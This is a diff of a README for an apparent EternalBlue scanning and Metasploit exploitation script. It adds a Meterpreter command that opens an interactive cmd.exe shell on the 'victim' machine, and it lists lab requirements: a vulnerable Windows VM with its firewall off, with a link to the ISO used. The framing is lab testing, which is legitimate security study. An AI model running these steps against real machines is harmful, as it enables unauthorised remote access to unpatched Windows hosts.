@@ -53,6 +53,11 @@ chmod +x scanner.sh
 ```bash
 sudo ./scanner.sh
 ```
+
+7. Start an interactive CMD session on the victim (Only if EternalBlue is found)
+```bash
+execute -f cmd.exe -H -c -i
+```
 <br>
 
 ## Usage Example (What you will see):
@@ -73,8 +78,12 @@ Launching Metasploit...
 ```
 <br>
 
-## Important:
-Make sure:
-- port 445 is open on the victim machine and firewall is turned off
-- both machines are on the same LAN
-- You are using Kali as the attacker
+## Requirements for Testing:
+- A vulnerable Windows virtual machine
+- Firewall disabled on the Windows VM
+- A vulnerable EternalBlue Service on port 445
+- Attacker machine must be Kali Linux
+- Both machines must be on the same network
+
+**The Windows VM that I used for testing**
+https://archive.org/details/Windows_Server_2008_R2_x64.iso_reupload
